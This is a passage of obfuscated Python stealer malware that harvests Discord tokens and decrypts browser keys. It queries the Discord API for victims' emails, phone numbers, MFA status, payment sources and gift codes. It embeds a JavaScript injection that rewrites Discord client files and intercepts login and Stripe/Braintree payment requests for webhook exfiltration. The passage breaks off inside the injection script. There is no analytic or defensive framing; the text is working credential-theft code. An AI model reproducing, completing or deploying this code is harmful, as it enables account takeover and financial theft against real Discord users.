            BLEVMLAZASAMAIECAXHVHSQMPYLBSTHKUVHEZWUWVCXUHFJBFPOTGWTXKQOBVLCSCYHCATIBWC = json.load(v4r_f)
        HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP = base64.b64decode(BLEVMLAZASAMAIECAXHVHSQMPYLBSTHKUVHEZWUWVCXUHFJBFPOTGWTXKQOBVLCSCYHCATIBWC["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP, None, None, None, 0)[1]

    HXYGVIYZAEHFSWWJMUQKMACYBHBRUHILPKTTNTUYCMUKBLQZCHZMRWTIPHLVSEDYPLBFFQBCHOKNKPLWJZAPESRIUFFMKRPC, NAEWFGELMQEYZMWHCEPQLVSVWLTLSRHIFRNTBYFQPGALOOOPLZ = OSZRBGNTKXKWLGDZPSLSYJFNWZNDRDHPFFDYIEAXYQTZPYBJXQRKLSHBHCTCNWFHUMTMRMOHOKTHF()
    
    if not HXYGVIYZAEHFSWWJMUQKMACYBHBRUHILPKTTNTUYCMUKBLQZCHZMRWTIPHLVSEDYPLBFFQBCHOKNKPLWJZAPESRIUFFMKRPC:
        UZUNNQOCSMPFLYOPIPRIYDDHOVHQTUNSUILADFRGRYFYIPFVDLVRZYISNBCGMSMEO = "No discord tokens found."

    for MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ_d15c0rd in HXYGVIYZAEHFSWWJMUQKMACYBHBRUHILPKTTNTUYCMUKBLQZCHZMRWTIPHLVSEDYPLBFFQBCHOKNKPLWJZAPESRIUFFMKRPC:
        HYSOZZZBKJRHQMKYBOZLJYVOGLVHMZGKETLUBBEIUXHUBUHGXZJOEFIDAI += 1

        try: OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ_d15c0rd}).json()
        except: OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL = {"None": "None"}

        SOBVUXUXXUJBIDWYZHKIACKNUDIHLLVMJWQNJFKRSRATLFZITFKHXATMXQXBFWZYEBHDFTDDPHSWJFVKXTYIZVDH = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('username', "None") + '#' + OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('discriminator', "None")
        KAKFEHQAVSBSNDBRXXADCLKHVROMUZCLBMNTODPXKVQRQBCEGITPWFEAVO = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('global_name', "None")
        BFGFBWVKXQKPVMULFQJSKZJJEDZMGNNEANTMCJQSWIIPDFRPCHLEOIUX = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('id', "None")
        AWZUJDLHSNFFSAIUVKXZXSHHCUGLLGHOEUVFYBBCFIPEAMXXIXIMRMVSVRVYHNOYEIYCMLUKKXXNSTEXC = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('email', "None")
        XGJZZKPHUTANVBKEHVRAWASVLEVKJQJODMJUFRHLOZHDVKWHVGNSIMFGXCERULWLLYTOSAAUGZZUSVDXVUSSBIGMQUQJS = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('verified', "None")
        LZDQJNVTNOPFMZMUDRQDWYUVSKETLKKBWMUZDGZCVKXEBDPSGTEMLCGQTRFQOXIVSDJNLFKRQXUYYVYUO = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('phone', "None")
        BGRDQXZBUKHFETOJAJXACQFFFWHSBNBFUFSEEMYDBDVFNJUDXECJVSDTVDF = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('locale', "None")
        SABPIIPJCFFNWPGWHKNPDMWPDDPUSELHDHZEFFQOGUMBIVLMDSURYOWHZVXJGJXXG = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('mfa_enabled', "None")

        try:
            if OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('premium_type', 'None') == 0:
                LMHOQEAAXDQCMLFNCAXSHSZSQOTWBYTKRFNXDSSXULQDLOFKWPFVBAIQQPYWGSMWWTHPGTHBE = 'False'
            elif OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('premium_type', 'None') == 1:
                LMHOQEAAXDQCMLFNCAXSHSZSQOTWBYTKRFNXDSSXULQDLOFKWPFVBAIQQPYWGSMWWTHPGTHBE = 'Nitro Classic'
            elif OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('premium_type', 'None') == 2:
                LMHOQEAAXDQCMLFNCAXSHSZSQOTWBYTKRFNXDSSXULQDLOFKWPFVBAIQQPYWGSMWWTHPGTHBE = 'Nitro Boosts'
            elif OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('premium_type', 'None') == 3:
                LMHOQEAAXDQCMLFNCAXSHSZSQOTWBYTKRFNXDSSXULQDLOFKWPFVBAIQQPYWGSMWWTHPGTHBE = 'Nitro Basic'
            else:
                LMHOQEAAXDQCMLFNCAXSHSZSQOTWBYTKRFNXDSSXULQDLOFKWPFVBAIQQPYWGSMWWTHPGTHBE = 'False'
        except:
            LMHOQEAAXDQCMLFNCAXSHSZSQOTWBYTKRFNXDSSXULQDLOFKWPFVBAIQQPYWGSMWWTHPGTHBE = "None"

        try: OPPDALQHTFHQEWDMOUJCQPWOXTJQQCGLSTPBTWMJYVRDSCYQTHUFBPIVZDVDLIHBCBNQNIYOICIHHTPJHCCB = f"https://cdn.discordapp.com/avatars/{BFGFBWVKXQKPVMULFQJSKZJJEDZMGNNEANTMCJQSWIIPDFRPCHLEOIUX}/{OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{BFGFBWVKXQKPVMULFQJSKZJJEDZMGNNEANTMCJQSWIIPDFRPCHLEOIUX}/{OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{BFGFBWVKXQKPVMULFQJSKZJJEDZMGNNEANTMCJQSWIIPDFRPCHLEOIUX}/{OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL['avatar']}.png"
        except: OPPDALQHTFHQEWDMOUJCQPWOXTJQQCGLSTPBTWMJYVRDSCYQTHUFBPIVZDVDLIHBCBNQNIYOICIHHTPJHCCB = "None"

        try:
            NLRWFEFBICQSXBIFQCUJFFZCFXYIQAZAGBENTMGOUVOXKXTOXJFVWLIWGESWVSRPSQPQEBSDHAMBNY = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ_d15c0rd}).json()
            if NLRWFEFBICQSXBIFQCUJFFZCFXYIQAZAGBENTMGOUVOXKXTOXJFVWLIWGESWVSRPSQPQEBSDHAMBNY:
                REWXOUDDKXNZGTITFDIQWMNIIACSGCUBKNUKDUXRXSGITWFFNTGUCQJZLIOKACSQFENFPAOIOXCAMZAJRKYMTLFUDZMN = []

                for v4r_method in NLRWFEFBICQSXBIFQCUJFFZCFXYIQAZAGBENTMGOUVOXKXTOXJFVWLIWGESWVSRPSQPQEBSDHAMBNY:
                    if v4r_method['type'] == 1:
                        REWXOUDDKXNZGTITFDIQWMNIIACSGCUBKNUKDUXRXSGITWFFNTGUCQJZLIOKACSQFENFPAOIOXCAMZAJRKYMTLFUDZMN.append('Bank Card')
                    elif v4r_method['type'] == 2:
                        REWXOUDDKXNZGTITFDIQWMNIIACSGCUBKNUKDUXRXSGITWFFNTGUCQJZLIOKACSQFENFPAOIOXCAMZAJRKYMTLFUDZMN.append("Paypal")
                    else:
                        REWXOUDDKXNZGTITFDIQWMNIIACSGCUBKNUKDUXRXSGITWFFNTGUCQJZLIOKACSQFENFPAOIOXCAMZAJRKYMTLFUDZMN.append('Other')
                REWXOUDDKXNZGTITFDIQWMNIIACSGCUBKNUKDUXRXSGITWFFNTGUCQJZLIOKACSQFENFPAOIOXCAMZAJRKYMTLFUDZMN = ' / '.join(REWXOUDDKXNZGTITFDIQWMNIIACSGCUBKNUKDUXRXSGITWFFNTGUCQJZLIOKACSQFENFPAOIOXCAMZAJRKYMTLFUDZMN)
            else:
                REWXOUDDKXNZGTITFDIQWMNIIACSGCUBKNUKDUXRXSGITWFFNTGUCQJZLIOKACSQFENFPAOIOXCAMZAJRKYMTLFUDZMN = "None"
        except:
            REWXOUDDKXNZGTITFDIQWMNIIACSGCUBKNUKDUXRXSGITWFFNTGUCQJZLIOKACSQFENFPAOIOXCAMZAJRKYMTLFUDZMN = "None"

        try:
            AWSRWOLDXVSGIIJCGGEHPINAJEYLUPPTWWECQTZCZEWIUZFPTSRWREKAZHBTJKDMDMD = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ_d15c0rd}).json()
            if AWSRWOLDXVSGIIJCGGEHPINAJEYLUPPTWWECQTZCZEWIUZFPTSRWREKAZHBTJKDMDMD:
                ZVIIGWCOQJLUIXRRMBQZZFVBJJZEMAZTFSUKJZMCYKUNYJGTYVZHWSJQGJIQDYAHQDENFEQSAKEDEYJMJAMTRFONRGJTMEEJFH = []
                for UHBBVJGTYHNBSDTICHKILLKDOIXMPCVHFNPETULRTCFCYZZTFCSIGCXZSFJECQVJFTQMQCWMUWGGWHPNSNZQNBJCVRRNQFLSZ in AWSRWOLDXVSGIIJCGGEHPINAJEYLUPPTWWECQTZCZEWIUZFPTSRWREKAZHBTJKDMDMD:
                    KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN = UHBBVJGTYHNBSDTICHKILLKDOIXMPCVHFNPETULRTCFCYZZTFCSIGCXZSFJECQVJFTQMQCWMUWGGWHPNSNZQNBJCVRRNQFLSZ['promotion']['outbound_title']
                    UHBBVJGTYHNBSDTICHKILLKDOIXMPCVHFNPETULRTCFCYZZTFCSIGCXZSFJECQVJFTQMQCWMUWGGWHPNSNZQNBJCVRRNQFLSZ = UHBBVJGTYHNBSDTICHKILLKDOIXMPCVHFNPETULRTCFCYZZTFCSIGCXZSFJECQVJFTQMQCWMUWGGWHPNSNZQNBJCVRRNQFLSZ['code']
                    YJUZPKYUHPOUYOHKLPGPZEVACQWALPSEIWSSZEUMEGXRECBWPEMX = f"Gift: \"{KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN}\" Code: \"{UHBBVJGTYHNBSDTICHKILLKDOIXMPCVHFNPETULRTCFCYZZTFCSIGCXZSFJECQVJFTQMQCWMUWGGWHPNSNZQNBJCVRRNQFLSZ}\""
                    if len('\n\n'.join(UHBBVJGTYHNBSDTICHKILLKDOIXMPCVHFNPETULRTCFCYZZTFCSIGCXZSFJECQVJFTQMQCWMUWGGWHPNSNZQNBJCVRRNQFLSZ)) + len(YJUZPKYUHPOUYOHKLPGPZEVACQWALPSEIWSSZEUMEGXRECBWPEMX) >= 1024:
                        break
                    ZVIIGWCOQJLUIXRRMBQZZFVBJJZEMAZTFSUKJZMCYKUNYJGTYVZHWSJQGJIQDYAHQDENFEQSAKEDEYJMJAMTRFONRGJTMEEJFH.append(YJUZPKYUHPOUYOHKLPGPZEVACQWALPSEIWSSZEUMEGXRECBWPEMX)
                if len(ZVIIGWCOQJLUIXRRMBQZZFVBJJZEMAZTFSUKJZMCYKUNYJGTYVZHWSJQGJIQDYAHQDENFEQSAKEDEYJMJAMTRFONRGJTMEEJFH) > 0:
                    UHBBVJGTYHNBSDTICHKILLKDOIXMPCVHFNPETULRTCFCYZZTFCSIGCXZSFJECQVJFTQMQCWMUWGGWHPNSNZQNBJCVRRNQFLSZ = '\n\n'.join(ZVIIGWCOQJLUIXRRMBQZZFVBJJZEMAZTFSUKJZMCYKUNYJGTYVZHWSJQGJIQDYAHQDENFEQSAKEDEYJMJAMTRFONRGJTMEEJFH)
                else:
                    UHBBVJGTYHNBSDTICHKILLKDOIXMPCVHFNPETULRTCFCYZZTFCSIGCXZSFJECQVJFTQMQCWMUWGGWHPNSNZQNBJCVRRNQFLSZ = "None"
            else:
                UHBBVJGTYHNBSDTICHKILLKDOIXMPCVHFNPETULRTCFCYZZTFCSIGCXZSFJECQVJFTQMQCWMUWGGWHPNSNZQNBJCVRRNQFLSZ = "None"
        except:
            UHBBVJGTYHNBSDTICHKILLKDOIXMPCVHFNPETULRTCFCYZZTFCSIGCXZSFJECQVJFTQMQCWMUWGGWHPNSNZQNBJCVRRNQFLSZ = "None"
    
        try: v4r_software_name, GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT = NAEWFGELMQEYZMWHCEPQLVSVWLTLSRHIFRNTBYFQPGALOOOPLZ.get(MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ_d15c0rd, ("Unknown", "Unknown"))
        except: v4r_software_name, GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT = "Unknown", "Unknown"

        UZUNNQOCSMPFLYOPIPRIYDDHOVHQTUNSUILADFRGRYFYIPFVDLVRZYISNBCGMSMEO = UZUNNQOCSMPFLYOPIPRIYDDHOVHQTUNSUILADFRGRYFYIPFVDLVRZYISNBCGMSMEO + f"""
Discord Account n°{str(HYSOZZZBKJRHQMKYBOZLJYVOGLVHMZGKETLUBBEIUXHUBUHGXZJOEFIDAI)}:
 - Path Found      : {GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT}
 - Software        : {v4r_software_name}
 - Token           : {MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ_d15c0rd}
 - Username        : {SOBVUXUXXUJBIDWYZHKIACKNUDIHLLVMJWQNJFKRSRATLFZITFKHXATMXQXBFWZYEBHDFTDDPHSWJFVKXTYIZVDH}
 - Display Name    : {KAKFEHQAVSBSNDBRXXADCLKHVROMUZCLBMNTODPXKVQRQBCEGITPWFEAVO}
 - Id              : {BFGFBWVKXQKPVMULFQJSKZJJEDZMGNNEANTMCJQSWIIPDFRPCHLEOIUX}
 - Email           : {AWZUJDLHSNFFSAIUVKXZXSHHCUGLLGHOEUVFYBBCFIPEAMXXIXIMRMVSVRVYHNOYEIYCMLUKKXXNSTEXC}
 - Email Verified  : {XGJZZKPHUTANVBKEHVRAWASVLEVKJQJODMJUFRHLOZHDVKWHVGNSIMFGXCERULWLLYTOSAAUGZZUSVDXVUSSBIGMQUQJS}
 - Phone           : {LZDQJNVTNOPFMZMUDRQDWYUVSKETLKKBWMUZDGZCVKXEBDPSGTEMLCGQTRFQOXIVSDJNLFKRQXUYYVYUO}
 - Nitro           : {LMHOQEAAXDQCMLFNCAXSHSZSQOTWBYTKRFNXDSSXULQDLOFKWPFVBAIQQPYWGSMWWTHPGTHBE}
 - Language        : {BGRDQXZBUKHFETOJAJXACQFFFWHSBNBFUFSEEMYDBDVFNJUDXECJVSDTVDF}
 - Billing         : {REWXOUDDKXNZGTITFDIQWMNIIACSGCUBKNUKDUXRXSGITWFFNTGUCQJZLIOKACSQFENFPAOIOXCAMZAJRKYMTLFUDZMN}
 - Gift Code       : {UHBBVJGTYHNBSDTICHKILLKDOIXMPCVHFNPETULRTCFCYZZTFCSIGCXZSFJECQVJFTQMQCWMUWGGWHPNSNZQNBJCVRRNQFLSZ}
 - Profile Picture : {OPPDALQHTFHQEWDMOUJCQPWOXTJQQCGLSTPBTWMJYVRDSCYQTHUFBPIVZDVDLIHBCBNQNIYOICIHHTPJHCCB}
 - Multi-Factor Authentication : {SABPIIPJCFFNWPGWHKNPDMWPDDPUSELHDHZEFFQOGUMBIVLMDSURYOWHZVXJGJXXG}
"""
    SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.writestr(f"Discord Accounts ({HYSOZZZBKJRHQMKYBOZLJYVOGLVHMZGKETLUBBEIUXHUBUHGXZJOEFIDAI}).txt", UZUNNQOCSMPFLYOPIPRIYDDHOVHQTUNSUILADFRGRYFYIPFVDLVRZYISNBCGMSMEO)

    return HYSOZZZBKJRHQMKYBOZLJYVOGLVHMZGKETLUBBEIUXHUBUHGXZJOEFIDAI

GCMYOBSBCXQNTLGNQOSHJQGIXMTUZUBCYCRHZZSHGSHFGMEUPRMEQEGICGHQLHEOUBQP = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
